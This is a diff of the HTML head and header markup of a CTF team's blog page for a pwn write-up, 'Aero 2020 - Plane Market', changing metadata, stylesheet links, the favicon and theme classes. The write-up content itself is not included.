@@ -1,7 +1,8 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang=en>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
+  
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
   <meta name="renderer" content="webkit">
@@ -15,14 +16,15 @@
   <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
   <meta http-equiv="window-target" content="_top">
   
+  
   <title>[Pwn] Aero 2020 - Plane Market | TeamRocketIST - Portuguese CTF Team</title>
-  <meta name="description" content="Plane Market   Description:416pts Solvers ??? … plane_market c8052c64cf194d22ca42f0ef4fa6ffc8libc.so.6 5f4f99671c3a200f7789dbb5307b04bbld-linux-x86-64.so.2 63d339810fe3d20a86e3ff2237e46d89 nc ctf.pra">
-<meta name="keywords" content="file_stream,io_file,io_file_struct,aero2020">
+  <meta name="description" content="Plane Market   Description: 416pts Solvers ??? … plane_market c8052c64cf194d22ca42f0ef4fa6ffc8 libc.so.6 5f4f99671c3a200f7789dbb5307b04bb ld-linux-x86-64.so.2 63d339810fe3d20a86e3ff2237e46d89 nc ctf.">
+<meta name="keywords" content="io_file_struct,io_file,file_stream,aero2020">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] Aero 2020 - Plane Market">
 <meta property="og:url" content="https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/index.html">
 <meta property="og:site_name" content="TEAMROCKETIST">
-<meta property="og:description" content="Plane Market   Description:416pts Solvers ??? … plane_market c8052c64cf194d22ca42f0ef4fa6ffc8libc.so.6 5f4f99671c3a200f7789dbb5307b04bbld-linux-x86-64.so.2 63d339810fe3d20a86e3ff2237e46d89 nc ctf.pra">
+<meta property="og:description" content="Plane Market   Description: 416pts Solvers ??? … plane_market c8052c64cf194d22ca42f0ef4fa6ffc8 libc.so.6 5f4f99671c3a200f7789dbb5307b04bb ld-linux-x86-64.so.2 63d339810fe3d20a86e3ff2237e46d89 nc ctf.">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.imgur.com/BHVaAKq.png">
 <meta property="og:image" content="https://i.imgur.com/XWC0ex8.png">
@@ -31,36 +33,39 @@
 <meta property="og:updated_time" content="2022-08-23T00:14:55.165Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] Aero 2020 - Plane Market">
-<meta name="twitter:description" content="Plane Market   Description:416pts Solvers ??? … plane_market c8052c64cf194d22ca42f0ef4fa6ffc8libc.so.6 5f4f99671c3a200f7789dbb5307b04bbld-linux-x86-64.so.2 63d339810fe3d20a86e3ff2237e46d89 nc ctf.pra">
+<meta name="twitter:description" content="Plane Market   Description: 416pts Solvers ??? … plane_market c8052c64cf194d22ca42f0ef4fa6ffc8 libc.so.6 5f4f99671c3a200f7789dbb5307b04bb ld-linux-x86-64.so.2 63d339810fe3d20a86e3ff2237e46d89 nc ctf.">
 <meta name="twitter:image" content="https://i.imgur.com/BHVaAKq.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://teamrocketist.github.io/2020/03/01/Pwn-Aero-2020-Plane-Market/index.html">
   
     <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
   
   
     <link rel="icon" href="data:image/vnd.microsoft.icon;base64,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" type="image/x-icon">
   
-  <!-- font-awesome CSS -->
-  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
-  
-  <link rel="stylesheet" href="/css/jquery.fancybox.min.css">
-
   <link rel="stylesheet" href="/css/style.css">
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
 </head>
-</html>
 
-<body class="main-center">
-  <section class="mainside">
+
+<body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
   <div class="slimContent">
     <div class="navbar-header">
       
       
       <div class="profile-block text-center">
         <a id="avatar" href="https://github.com/teamrocketist" target="_blank">
-          <img class="thumb-xl img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
         </a>
         <h2 id="name" class="hidden-xs hidden-sm">TeamRocketIST</h2>
